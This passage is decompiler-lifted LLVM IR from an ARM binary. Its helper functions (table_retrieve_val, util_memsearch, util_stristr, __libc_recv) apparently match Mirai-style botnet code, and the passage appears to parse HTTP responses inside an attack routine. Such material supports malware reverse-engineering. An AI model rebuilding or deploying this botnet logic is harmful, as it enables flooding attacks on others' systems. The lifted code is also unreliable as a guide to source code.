  %v2_8e14 = sub i32 %v3_8e10, %v0_8e08
  store i32 %v2_8e14, i32* @r4, align 4
  store i32 %v2_8e14, i32* @r2, align 4
  store i32 %v2_8e14, i32* %v2_8e10, align 4
  %v0_8e20 = load i32, i32* @r7, align 4
  %v1_8e20 = load i32, i32* @r6, align 4
  %v2_8e20 = add i32 %v1_8e20, %v0_8e20
  store i32 %v2_8e20, i32* @r1, align 4
  store i32 %v0_8e20, i32* @r0, align 4
  %v3_8e28 = call i32 @memmove(i32 %v0_8e20, i32 %v2_8e20, i32 %v2_8e14)
  store i32 %v3_8e28, i32* %r0.global-to-local, align 4
  %v0_8e2c = load i32, i32* @sl, align 4
  %v1_8e2c = add i32 %v0_8e2c, 660
  %v2_8e2c = inttoptr i32 %v1_8e2c to i32*
  %v3_8e2c = load i32, i32* %v2_8e2c, align 4
  store i32 %v3_8e2c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8e34 = load i32, i32* %sb.global-to-local, align 4
  %v2_8e34 = add i32 %v0_8e34, %v3_8e2c
  store i32 %v2_8e34, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e38 = icmp eq i32 %v3_8e2c, 0
  store i1 %v2_8e38, i1* %cpsr_z.global-to-local, align 1
  %v3_8e3c = add i32 %v2_8e34, 2116
  %v4_8e3c = inttoptr i32 %v3_8e3c to i8*
  store i8 0, i8* %v4_8e3c, align 1
  %v0_8e40 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e40, label %dec_label_pc_8e58, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8da4
  %v0_8e44 = load i32, i32* @sl, align 4
  %v1_8e44 = add i32 %v0_8e44, 12
  %v2_8e44 = inttoptr i32 %v1_8e44 to i32*
  %v3_8e44 = load i32, i32* %v2_8e44, align 4
  store i32 %v3_8e44, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e48 = icmp eq i32 %v3_8e44, 0
  store i1 %v2_8e48, i1* %cpsr_z.global-to-local, align 1
  %v5_8e4c = icmp sgt i32 %v3_8e44, 0
  br i1 %v5_8e4c, label %dec_label_pc_8dbc, label %dec_label_pc_8e50

dec_label_pc_8e50:                                ; preds = %dec_label_pc_8e44
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8e58:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8e08
  %v0_8e58 = load i32, i32* @sl, align 4
  %v1_8e58 = add i32 %v0_8e58, -1448
  %v2_8e58 = inttoptr i32 %v1_8e58 to i8*
  %v3_8e58 = load i8, i8* %v2_8e58, align 1
  %v4_8e58 = zext i8 %v3_8e58 to i32
  store i32 %v4_8e58, i32* %r3.global-to-local, align 4
  %v2_8e5c = icmp ugt i8 %v3_8e58, 6
  store i1 %v2_8e5c, i1* %cpsr_c.global-to-local, align 1
  %v7_8e5c = icmp eq i8 %v3_8e58, 7
  store i1 %v7_8e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e5c, label %dec_label_pc_8e64, label %dec_label_pc_87ec

dec_label_pc_8e64:                                ; preds = %dec_label_pc_8e58
  %v1_8e64 = add i32 %v0_8e58, 660
  %v2_8e64 = inttoptr i32 %v1_8e64 to i32*
  %v3_8e64 = load i32, i32* %v2_8e64, align 4
  store i32 %v3_8e64, i32* @r3, align 4
  %v2_8e68 = icmp ugt i32 %v3_8e64, 1023
  store i1 %v2_8e68, i1* %cpsr_c.global-to-local, align 1
  %v7_8e68 = icmp eq i32 %v3_8e64, 1024
  store i1 %v7_8e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e68, label %dec_label_pc_8e70.loopexit, label %dec_label_pc_8d74

dec_label_pc_8e70.loopexit:                       ; preds = %dec_label_pc_8e64
  %v0_8e70.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_8e78.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e70.loopexit, %dec_label_pc_8d58
  %v0_8e78 = phi i32 [ %v0_8e78.pre, %dec_label_pc_8e70.loopexit ], [ %v1_8d6c, %dec_label_pc_8d58 ]
  %v0_8e70 = phi i32 [ %v0_8e70.pre, %dec_label_pc_8e70.loopexit ], [ %v0_8d60, %dec_label_pc_8d58 ]
  %v1_8e74 = add i32 %v0_8e70, 2180
  store i32 %v1_8e74, i32* @r1, align 4
  store i32 %v0_8e78, i32* @r0, align 4
  store i32 960, i32* @r2, align 4
  %v3_8e80 = call i32 @memmove(i32 %v0_8e78, i32 %v1_8e74, i32 960)
  store i32 %v3_8e80, i32* %r0.global-to-local, align 4
  %v0_8e84 = load i32, i32* @sl, align 4
  %v1_8e84 = add i32 %v0_8e84, 660
  %v2_8e84 = inttoptr i32 %v1_8e84 to i32*
  %v3_8e84 = load i32, i32* %v2_8e84, align 4
  store i32 %v3_8e84, i32* %r3.global-to-local, align 4
  %v1_8e88 = add i32 %v3_8e84, -64
  store i32 %v1_8e88, i32* @r4, align 4
  store i32 %v1_8e88, i32* %v2_8e84, align 4
  br label %dec_label_pc_8d74

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8dbc
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v3_8e9c = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_8ea0 = load i32, i32* @r4, align 4
  store i32 %v0_8ea0, i32* %r1.global-to-local, align 4
  store i32 %v3_8e9c, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8eac = load i32, i32* @r7, align 4
  store i32 %v0_8eac, i32* %r0.global-to-local, align 4
  %v4_8eb0 = call i32 @util_memsearch(i32 %v0_8eac, i32 %v0_8ea0, i32 %v3_8e9c, i32 11)
  store i32 %v4_8eb0, i32* %r0.global-to-local, align 4
  %v3_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v3_8eb4, i1* %cpsr_c.global-to-local, align 1
  %v8_8eb4 = icmp eq i32 %v4_8eb0, -1
  store i1 %v8_8eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8eb4, label %dec_label_pc_8ebc, label %dec_label_pc_998c

dec_label_pc_8ebc:                                ; preds = %dec_label_pc_8e94
  %v0_8ebc = load i32, i32* @sl, align 4
  %v1_8ebc = add i32 %v0_8ebc, 12
  %v2_8ebc = inttoptr i32 %v1_8ebc to i32*
  %v3_8ebc = load i32, i32* %v2_8ebc, align 4
  store i32 %v3_8ebc, i32* @r5, align 4
  br label %dec_label_pc_8de0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8de8
  %v0_8ec4 = load i32, i32* @r7, align 4
  store i32 %v0_8ec4, i32* %r0.global-to-local, align 4
  %v1_8ec8 = add i32 %v0_8de8, 660
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  store i32 %v3_8ec8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8ed4 = call i32 @util_memsearch(i32 %v0_8ec4, i32 %v3_8ec8, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  store i32 %v5_8ed4, i32* %r0.global-to-local, align 4
  %v2_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v2_8ed8, i1* %cpsr_c.global-to-local, align 1
  %v7_8ed8 = icmp eq i32 %v5_8ed4, -1
  store i1 %v7_8ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ed8, label %dec_label_pc_8e08, label %dec_label_pc_8ee0

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8ec4
  %v0_8ee0 = load i32, i32* @sl, align 4
  %v1_8ee0 = add i32 %v0_8ee0, 660
  %v2_8ee0 = inttoptr i32 %v1_8ee0 to i32*
  %v3_8ee0 = load i32, i32* %v2_8ee0, align 4
  store i32 %v3_8ee0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8eec = load i32, i32* @r7, align 4
  store i32 %v0_8eec, i32* %r0.global-to-local, align 4
  %v5_8ef0 = call i32 @util_memsearch(i32 %v0_8eec, i32 %v3_8ee0, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  %v0_8ef4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8ef4 = add i32 %v0_8ef4, %v5_8ef0
  store i32 %v2_8ef4, i32* %ip.global-to-local, align 4
  store i32 %v5_8ef0, i32* @r6, align 4
  store i32 %v5_8ef0, i32* %r1.global-to-local, align 4
  %v0_8f00 = load i32, i32* @r7, align 4
  store i32 %v0_8f00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32* %r2.global-to-local, align 4
  %v0_8f08 = load i32, i32* @r4, align 4
  store i32 %v0_8f08, i32* %r3.global-to-local, align 4
  %v0_8f0c = load i32, i32* @r5, align 4
  %v1_8f0c = trunc i32 %v0_8f0c to i8
  %v3_8f0c = add i32 %v2_8ef4, 2114
  %v4_8f0c = inttoptr i32 %v3_8f0c to i8*
  store i8 %v1_8f0c, i8* %v4_8f0c, align 1
  %v4_8f10 = call i32 @util_memsearch(i32 %v0_8f00, i32 %v5_8ef0, i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32 %v0_8f08)
  store i32 %v4_8f10, i32* %r0.global-to-local, align 4
  %v2_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v2_8f14, i1* %cpsr_c.global-to-local, align 1
  %v7_8f14 = icmp eq i32 %v4_8f10, -1
  store i1 %v7_8f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8f14, label %dec_label_pc_8f38, label %dec_label_pc_8f1c

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ee0
  %v0_8f1c = load i32, i32* @r7, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v0_8f20 = load i32, i32* @r6, align 4
  store i32 %v0_8f20, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32* %r2.global-to-local, align 4
  %v0_8f28 = load i32, i32* @r4, align 4
  store i32 %v0_8f28, i32* %r3.global-to-local, align 4
  %v4_8f2c = call i32 @util_memsearch(i32 %v0_8f1c, i32 %v0_8f20, i32 ptrtoint (i32* @global_var_1a7a8.49 to i32), i32 %v0_8f28)
  %v0_8f30 = load i32, i32* %sb.global-to-local, align 4
  %v2_8f30 = add i32 %v0_8f30, %v4_8f2c
  store i32 %v2_8f30, i32* %r0.global-to-local, align 4
  %v0_8f34 = load i32, i32* @r5, align 4
  %v1_8f34 = trunc i32 %v0_8f34 to i8
  %v3_8f34 = add i32 %v2_8f30, 2116
  %v4_8f34 = inttoptr i32 %v3_8f34 to i8*
  store i8 %v1_8f34, i8* %v4_8f34, align 1
  br label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8f1c
  %v0_8f38 = load i32, i32* @r7, align 4
  store i32 %v0_8f38, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f40 = inttoptr i32 %v0_8f38 to i8*
  %v3_8f40 = call i32 @util_atoi(i8* %v2_8f40, i32 16)
  store i32 %v3_8f40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f44 = icmp eq i32 %v3_8f40, 0
  store i1 %v2_8f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f44, label %dec_label_pc_9b40, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f38
  %v1_8f4c = add i32 %v3_8f40, 2
  store i32 %v1_8f4c, i32* %r3.global-to-local, align 4
  %v1_8f50 = load i32, i32* @sl, align 4
  %v2_8f50 = add i32 %v1_8f50, 12
  %v3_8f50 = inttoptr i32 %v2_8f50 to i32*
  store i32 %v1_8f4c, i32* %v3_8f50, align 4
  br label %dec_label_pc_8e08

dec_label_pc_8f58:                                ; preds = %dec_label_pc_85c4
  %v2_8f58 = inttoptr i32 %v1_8618 to i32*
  %v3_8f58 = load i32, i32* %v2_8f58, align 4
  store i32 %v3_8f58, i32* %ip.global-to-local, align 4
  %v3_8f60 = udiv i32 %v3_8f58, 32
  %v3_8f64 = mul nuw nsw i32 %v3_8f60, 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8f6c = add i32 %v3_8f64, %v2_8710
  store i32 %v2_8f6c, i32* %r2.global-to-local, align 4
  %v1_8f70 = add i32 %v2_8f6c, -164
  %v2_8f70 = inttoptr i32 %v1_8f70 to i32*
  %v3_8f70 = load i32, i32* %v2_8f70, align 4
  %v1_8f74 = urem i32 %v3_8f58, 32
  store i32 %v1_8f74, i32* %r0.global-to-local, align 4
  store i32 %v1_85bc, i32* %r3.global-to-local, align 4
  %v7_8f7c = shl i32 %v1_85bc, %v1_8f74
  %v8_8f7c = or i32 %v3_8f70, %v7_8f7c
  store i32 %v8_8f7c, i32* @r1, align 4
  %v1_8f80 = load i32, i32* @r8, align 4
  %v2_8f80 = sub i32 %v3_8f58, %v1_8f80
  %v3_8f80 = icmp uge i32 %v3_8f58, %v1_8f80
  store i1 %v3_8f80, i1* %cpsr_c.global-to-local, align 1
  %v4_8f80 = xor i32 %v1_8f80, %v3_8f58
  %v5_8f80 = xor i32 %v2_8f80, %v3_8f58
  %v6_8f80 = and i32 %v5_8f80, %v4_8f80
  %v7_8f80 = icmp slt i32 %v6_8f80, 0
  %v8_8f80 = icmp slt i32 %v2_8f80, 0
  %v9_8f80 = icmp eq i32 %v3_8f58, %v1_8f80
  store i1 %v9_8f80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f7c, i32* %v2_8f70, align 4
  %v3_8f88 = xor i1 %v8_8f80, %v7_8f80
  %v4_8f88 = or i1 %v9_8f80, %v3_8f88
  br i1 %v4_8f88, label %dec_label_pc_85f4, label %dec_label_pc_8f8c

dec_label_pc_8f8c:                                ; preds = %dec_label_pc_8f58
  %v0_8f8c = load i32, i32* %ip.global-to-local, align 4
  %v1_8f8c = load i32, i32* %r3.global-to-local, align 4
  %v2_8f8c = add i32 %v1_8f8c, %v0_8f8c
  store i32 %v2_8f8c, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r0.global-to-local, align 4
  %v1_8f98 = call i32 @__GI___libc_close(i32 %v3_888c)
  store i32 %v1_8f98, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8fa0 = load i32, i32* @sl, align 4
  %v2_8fa0 = add i32 %v1_8fa0, -1452
  %v3_8fa0 = inttoptr i32 %v2_8fa0 to i32*
  store i32 -1, i32* %v3_8fa0, align 4
  %v0_8fa4 = load i32, i32* @r5, align 4
  %v1_8fa4 = trunc i32 %v0_8fa4 to i8
  %v2_8fa4 = load i32, i32* @sl, align 4
  %v3_8fa4 = add i32 %v2_8fa4, -1448
  %v4_8fa4 = inttoptr i32 %v3_8fa4 to i8*
  store i8 %v1_8fa4, i8* %v4_8fa4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_8fac:                                ; preds = %dec_label_pc_85cc
  %v2_8fac = inttoptr i32 %v1_8618 to i32*
  %v3_8fac = load i32, i32* %v2_8fac, align 4
  store i32 %v3_8fac, i32* %ip.global-to-local, align 4
  %v3_8fb4 = udiv i32 %v3_8fac, 32
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v3_8fbc = mul nuw nsw i32 %v3_8fb4, 4
  %v2_8fc0 = add i32 %v3_8fbc, %v2_8710
  store i32 %v2_8fc0, i32* %r2.global-to-local, align 4
  %v1_8fc4 = add i32 %v2_8fc0, -164
  %v2_8fc4 = inttoptr i32 %v1_8fc4 to i32*
  %v3_8fc4 = load i32, i32* %v2_8fc4, align 4
  %v1_8fc8 = urem i32 %v3_8fac, 32
  store i32 %v1_8fc8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8fd0 = shl i32 1, %v1_8fc8
  %v8_8fd0 = or i32 %v3_8fc4, %v7_8fd0
  store i32 %v8_8fd0, i32* @r1, align 4
  %v1_8fd4 = load i32, i32* @r8, align 4
  %v2_8fd4 = sub i32 %v3_8fac, %v1_8fd4
  %v3_8fd4 = icmp uge i32 %v3_8fac, %v1_8fd4
  store i1 %v3_8fd4, i1* %cpsr_c.global-to-local, align 1
  %v4_8fd4 = xor i32 %v1_8fd4, %v3_8fac
  %v5_8fd4 = xor i32 %v2_8fd4, %v3_8fac
  %v6_8fd4 = and i32 %v5_8fd4, %v4_8fd4
  %v7_8fd4 = icmp slt i32 %v6_8fd4, 0
  %v8_8fd4 = icmp slt i32 %v2_8fd4, 0
  %v9_8fd4 = icmp eq i32 %v3_8fac, %v1_8fd4
  store i1 %v9_8fd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8fd0, i32* %v2_8fc4, align 4
  %v3_8fdc = xor i1 %v8_8fd4, %v7_8fd4
  %v4_8fdc = or i1 %v9_8fd4, %v3_8fdc
  br i1 %v4_8fdc, label %dec_label_pc_85f4, label %dec_label_pc_8fe0

dec_label_pc_8fe0:                                ; preds = %dec_label_pc_8fac
  %v0_8fe0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fe0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe0 = add i32 %v1_8fe0, %v0_8fe0
  store i32 %v2_8fe0, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_9028:                                ; preds = %dec_label_pc_87d0
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_9030 = call i32 @util_zero(i32 %v2_827c, i32 10240)
  store i32 %v2_9030, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_903c = load i32, i32* @sl, align 4
  %v1_903c = add i32 %v0_903c, -1452
  %v2_903c = inttoptr i32 %v1_903c to i32*
  %v3_903c = load i32, i32* %v2_903c, align 4
  store i32 %v3_903c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9048 = call i32 @__libc_recv(i32 %v3_903c, i32 %v2_827c, i32 10240, i32 16386)
  store i32 %v4_9048, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9050 = icmp eq i32 %v4_9048, 0
  store i1 %v2_9050, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp181 = icmp slt i32 %v4_9048, 1
  br i1 %tmp181, label %dec_label_pc_9550, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9028
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  store i32 %v4_9048, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7a0.51 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_906c = call i32 @util_memsearch(i32 %v2_827c, i32 %v4_9048, i32 ptrtoint ([5 x i8]* @global_var_1a7a0.51 to i32), i32 4)
  store i32 %v5_906c, i32* %r0.global-to-local, align 4
  %v3_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v3_9070, i1* %cpsr_c.global-to-local, align 1
  %v8_9070 = icmp eq i32 %v5_906c, -1
  store i1 %v8_9070, i1* %cpsr_z.global-to-local, align 1
  %v0_9078 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v3_9070, label %dec_label_pc_9078, label %dec_label_pc_9080

dec_label_pc_9078:                                ; preds = %dec_label_pc_905c
  %v3_9078 = icmp ugt i32 %v0_9078, 10239
  store i1 %v3_9078, i1* %cpsr_c.global-to-local, align 1
  %v8_9078 = icmp eq i32 %v0_9078, 10240
  store i1 %v8_9078, i1* %cpsr_z.global-to-local, align 1
  %v5_907c = icmp slt i32 %v0_9078, 10240
  br i1 %v5_907c, label %dec_label_pc_87ec, label %dec_label_pc_9080

dec_label_pc_9080:                                ; preds = %dec_label_pc_905c, %dec_label_pc_9078
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a7a0.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_9078, i32* %r1.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v5_9090 = call i32 @util_memsearch(i32 %v2_827c, i32 %v0_9078, i32 ptrtoint ([5 x i8]* @global_var_1a7a0.51 to i32), i32 4)
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_909c = add i32 %v5_9090, %v2_827c
  %v5_909c = inttoptr i32 %v4_909c to i8*
  store i8 0, i8* %v5_909c, align 1
  %v0_90a0 = load i32, i32* @r5, align 4
  store i32 %v0_90a0, i32* %r1.global-to-local, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v2_90a8 = inttoptr i32 %v0_90a0 to i32*
  %v3_90a8 = call i32 @table_retrieve_val(i32 53, i32* %v2_90a8)
  %v0_90ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90ac, i32* @r1, align 4
  store i32 %v3_90a8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90b8 = call i32 @util_stristr(i8* %tmp168, i32 %v0_90ac, i32 %v3_90a8)
  store i32 %v4_90b8, i32* %r0.global-to-local, align 4
  %v2_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v2_90bc, i1* %cpsr_c.global-to-local, align 1
  %v7_90bc = icmp eq i32 %v4_90b8, -1
  store i1 %v7_90bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90bc, label %.thread23, label %bb182

bb182:                                            ; preds = %dec_label_pc_9080
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_90c4 = load i32, i32* @sl, align 4
  %v3_90c4 = inttoptr i32 %v2_90c4 to i32*
  store i32 2, i32* %v3_90c4, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_9080, %bb182
  %v0_90c8 = load i32, i32* @r5, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r0.global-to-local, align 4
  %v2_90d0 = inttoptr i32 %v0_90c8 to i32*
  %v3_90d0 = call i32 @table_retrieve_val(i32 52, i32* %v2_90d0)
  %v0_90d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90d4, i32* @r1, align 4
  store i32 %v3_90d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90e0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_90d4, i32 %v3_90d0)
  store i32 %v4_90e0, i32* %r0.global-to-local, align 4
  %v2_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v2_90e4, i1* %cpsr_c.global-to-local, align 1
  %v7_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v7_90e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e4, label %.thread24, label %bb183

bb183:                                            ; preds = %.thread23
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_90ec = load i32, i32* @sl, align 4
  %v3_90ec = inttoptr i32 %v2_90ec to i32*
  store i32 1, i32* %v3_90ec, align 4
  br label %.thread24

.thread24:                                        ; preds = %.thread23, %bb183
  %v0_90f0 = load i32, i32* @r5, align 4
  store i32 %v0_90f0, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_90f8 = load i32, i32* @sl, align 4
  %v2_90f8 = add i32 %v1_90f8, 4
  %v3_90f8 = inttoptr i32 %v2_90f8 to i32*
  store i32 %v0_90f0, i32* %v3_90f8, align 4
  %v2_90fc = inttoptr i32 %v0_90f0 to i32*
  %v3_90fc = call i32 @table_retrieve_val(i32 51, i32* %v2_90fc)
  %v0_9100 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9100, i32* @r1, align 4
  store i32 %v3_90fc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_910c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9100, i32 %v3_90fc)
  store i32 %v4_910c, i32* %r0.global-to-local, align 4
  %v2_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v2_9110, i1* %cpsr_c.global-to-local, align 1
  %v7_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v7_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9110, label %.thread25, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %.thread24
  %v0_9118 = load i32, i32* @r5, align 4
  store i32 %v0_9118, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v2_9120 = inttoptr i32 %v0_9118 to i32*
  %v3_9120 = call i32 @table_retrieve_val(i32 51, i32* %v2_9120)
  %v0_9124 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9124, i32* @r1, align 4
  store i32 %v3_9120, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9130 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9124, i32 %v3_9120)
  store i32 %v4_9130, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9138 = add i32 %v4_9130, %v2_827c
  %v3_9138 = inttoptr i32 %v2_9138 to i8*
  %v4_9138 = load i8, i8* %v3_9138, align 1
  %v2_9140 = icmp ugt i8 %v4_9138, 31
  store i1 %v2_9140, i1* %cpsr_c.global-to-local, align 1
  %v7_9140 = icmp eq i8 %v4_9138, 32
  store i1 %v7_9140, i1* %cpsr_z.global-to-local, align 1
  %v2_9148 = zext i1 %v7_9140 to i32
  %v2_9148.v4_9130 = add i32 %v2_9148, %v4_9130
  store i32 %v2_9148.v4_9130, i32* @r4, align 4
  %v2_914c = add i32 %v2_9148.v4_9130, %v2_827c
  store i32 %v2_914c, i32* @r6, align 4
  store i32 %v2_914c, i32* %r0.global-to-local, align 4
  %v1_9154 = load i32, i32* %fp.global-to-local, align 4
  %v2_9154 = sub i32 %v1_9154, %v2_9148.v4_9130
  store i32 %v2_9154, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9160 = call i32 @util_memsearch(i32 %v2_914c, i32 %v2_9154, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2)
  store i32 %v5_9160, i32* %r0.global-to-local, align 4
  %v2_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v2_9164, i1* %cpsr_c.global-to-local, align 1
  %v7_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v7_9164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9164, label %.thread25, label %dec_label_pc_916c

dec_label_pc_916c:                                ; preds = %dec_label_pc_9118
  %v2_916c = icmp ne i32 %v5_9160, 0
  store i1 %v2_916c, i1* %cpsr_c.global-to-local, align 1
  %v7_916c = icmp eq i32 %v5_9160, 1
  store i1 %v7_916c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9174 = icmp slt i32 %v5_9160, 2
  br i1 %v7_9174, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_916c
  %v9_9174 = add i32 %v5_9160, -2
  store i32 %v9_9174, i32* %r0.global-to-local, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_916c, %bb184
  %v1_917c = phi i32 [ %v5_9160, %dec_label_pc_916c ], [ %v9_9174, %bb184 ]
  store i32 %v2_8710, i32* %r2.global-to-local, align 4
  %v2_917c = add i32 %v1_917c, %v2_8710
  %v1_9180 = load i32, i32* @r4, align 4
  %v2_9180 = add i32 %v2_917c, %v1_9180
  store i32 %v2_9180, i32* %r3.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9184 = trunc i32 %v0_9184 to i8
  %v3_9184 = load i32, i32* @r7, align 4
  %v4_9184 = add i32 %v3_9184, %v2_9180
  %v5_9184 = inttoptr i32 %v4_9184 to i8*
  store i8 %v1_9184, i8* %v5_9184, align 1
  %v0_9188 = load i32, i32* @r6, align 4
  store i32 %v0_9188, i32* %r0.global-to-local, align 4
  %v1_918c = inttoptr i32 %v0_9188 to i8*
  %v2_918c = call i32 @util_strlen(i8* %v1_918c)
  %v0_9190 = load i32, i32* @r5, align 4
  store i32 %v0_9190, i32* %r1.global-to-local, align 4
  store i32 %v2_918c, i32* @r4, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v2_919c = inttoptr i32 %v0_9190 to i32*
  %v3_919c = call i32 @table_retrieve_val(i32 50, i32* %v2_919c)
  %v0_91a0 = load i32, i32* @r4, align 4
  store i32 %v0_91a0, i32* @r1, align 4
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v0_91a8 = load i32, i32* @r6, align 4
  store i32 %v0_91a8, i32* %r0.global-to-local, align 4
  %v3_91ac = inttoptr i32 %v0_91a8 to i8*
